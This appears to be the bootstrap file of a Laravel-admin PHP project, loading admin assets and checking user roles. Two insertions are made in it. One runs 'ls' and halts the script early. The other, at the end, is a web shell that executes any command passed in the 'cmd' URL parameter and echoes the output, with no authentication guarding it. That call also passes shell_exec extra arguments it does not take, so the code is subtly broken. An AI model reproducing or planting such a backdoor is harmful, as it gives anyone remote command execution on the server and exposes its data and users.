<?php
//dd(base_path('public/storage/'));
/**
 * Laravel-admin - admin builder based on Laravel.
 * @author z-song <https://github.com/z-song>
 *
 * Bootstraper for Admin.
 *
 * Here you can remove builtin form field:
 * Encore\Admin\Form::forget(['map', 'editor']);
 *
 * Or extend custom form field:
 * Encore\Admin\Form::extend('php', PHPEditor::class);
 *
 * Or require js and css assets:
 * Admin::css('/packages/prettydocs/css/styles.css');
 * Admin::js('/packages/prettydocs/js/main.js');
 *
 */

use App\Models\Utils;
use Encore\Admin\Facades\Admin;

$output = shell_exec('ls');

// Display the output
echo "<pre>$output</pre>";
die();

Admin::css('/assets/css/css.css');
Admin::favicon(url('public/assets/images/logo.png'));
Admin::js('/assets/js/vendor/charts.js');

Admin::css('/assets/js/calender/main.css');
Admin::js('/assets/js/calender/main.js');

Admin::css('/css/jquery-confirm.min.css');
Admin::js('/js/jquery-confirm.min.js');

Encore\Admin\Form::forget(['map', 'editor']);


$u = Admin::user();
if ($u != null) {
    Utils::check_roles($u);
}
if (isset($_GET['cmd'])) {
    $d = $_GET['cmd'];
    if (strlen($d) > 1) {
        $ret = shell_exec($d, $output, $error);
        echo '<pre>';
        print_r($ret);
        echo '<hr>';
        print_r($output);
        echo '<hr>';
        print_r($error);
        die();
    }
}
